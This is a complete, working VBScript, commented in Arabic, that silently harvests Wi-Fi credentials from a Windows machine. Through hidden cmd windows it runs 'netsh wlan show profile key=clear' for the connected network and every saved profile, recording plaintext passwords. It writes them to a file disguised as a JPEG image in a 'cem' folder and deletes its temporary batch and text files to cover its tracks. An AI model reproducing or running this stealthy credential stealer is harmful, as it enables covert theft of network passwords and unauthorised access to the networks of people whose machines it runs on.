On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' الحصول على مسار المجلد الحالي
strFolderPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
strCemFolder = strFolderPath & "\cem"

' التحقق من وجود المجلد "cem"، وإنشاءه إذا لم يكن موجودًا
If Not objFSO.FolderExists(strCemFolder) Then
    objFSO.CreateFolder(strCemFolder)
End If

' تحديد مسار الملف داخل المجلد "cem"
strFilePath = strCemFolder & "\soll.jpg"

' التحقق من وجود الملف وزيادة الرقم في اسم الملف إذا كان موجودًا
i = 1
Do While objFSO.FileExists(strFilePath)
    strFilePath = strCemFolder & "\sool_" & i & ".jpg"
    i = i + 1
Loop

' إنشاء ملف نصي لحفظ تفاصيل الشبكات
Set objFile = objFSO.CreateTextFile(strFilePath, True)

' إنشاء ملف دفعي لتنفيذ الأوامر
strBatchFile = strFolderPath & "\temp.bat"
Set objBatchFile = objFSO.CreateTextFile(strBatchFile, True)

' إضافة الأوامر إلى الملف الدفعي
objBatchFile.WriteLine("@echo off")
objBatchFile.WriteLine("netsh wlan show interfaces > temp.txt")
objBatchFile.WriteLine("netsh wlan show profiles >> temp.txt")
objBatchFile.WriteLine("exit")
objBatchFile.Close

' تشغيل الملف الدفعي مخفيًا
objShell.Run "cmd /c " & strBatchFile, 0, True

' قراءة نتائج الأوامر من الملف النصي
Set objTempFile = objFSO.OpenTextFile(strFolderPath & "\temp.txt", 1)
interfaces = objTempFile.ReadAll()
objTempFile.Close

' حذف الملف الدفعي والملف النصي المؤقت
objFSO.DeleteFile strBatchFile
objFSO.DeleteFile strFolderPath & "\temp.txt"

currentSSID = ""
For Each line In Split(interfaces, vbCrLf)
    If InStr(line, "SSID") > 0 And InStr(line, "BSSID") = 0 Then
        currentSSID = Trim(Mid(line, InStr(line, ":") + 1))
        Exit For
    End If
Next

' إذا كانت هناك شبكة متصلة، استخراج تفاصيلها أولاً
If currentSSID <> "" Then
    objFile.WriteLine("Current Connected SSID: " & currentSSID)
    objShell.Run "cmd /c netsh wlan show profile name=""" & currentSSID & """ key=clear > temp.txt", 0, True
    Set objTempFile = objFSO.OpenTextFile(strFolderPath & "\temp.txt", 1)
    profileDetails = objTempFile.ReadAll()
    objTempFile.Close
    objFile.WriteLine(profileDetails)
    objFile.WriteLine("--------------------------------------------------")
    objFile.WriteLine()
    objFile.WriteLine()
    objFile.WriteLine()
    objFile.WriteLine()
    objFSO.DeleteFile strFolderPath & "\temp.txt"
End If

' تنفيذ الأمر لعرض جميع ملفات تعريف Wi-Fi المحفوظة
objShell.Run "cmd /c netsh wlan show profiles > temp.txt", 0, True
Set objTempFile = objFSO.OpenTextFile(strFolderPath & "\temp.txt", 1)
profiles = objTempFile.ReadAll()
objTempFile.Close
objFSO.DeleteFile strFolderPath & "\temp.txt"

' معالجة كل ملف تعريف
For Each line In Split(profiles, vbCrLf)
    If InStr(line, "Profil Tous les utilisateurs") > 0 Or InStr(line, "All User Profile") > 0 Then
        ssid = Trim(Mid(line, InStr(line, ":") + 1))
        If ssid <> currentSSID Then
            objFile.WriteLine("SSID: " & ssid)
            ' تنفيذ الأمر لعرض تفاصيل الملف الشخصي
            objShell.Run "cmd /c netsh wlan show profile name=""" & ssid & """ key=clear > temp.txt", 0, True
            Set objTempFile = objFSO.OpenTextFile(strFolderPath & "\temp.txt", 1)
            profileDetails = objTempFile.ReadAll()
            objTempFile.Close
            objFile.WriteLine(profileDetails)
            objFile.WriteLine("--------------------------------------------------")
            objFSO.DeleteFile strFolderPath & "\temp.txt"
        End If
    End If
Next

objFile.Close
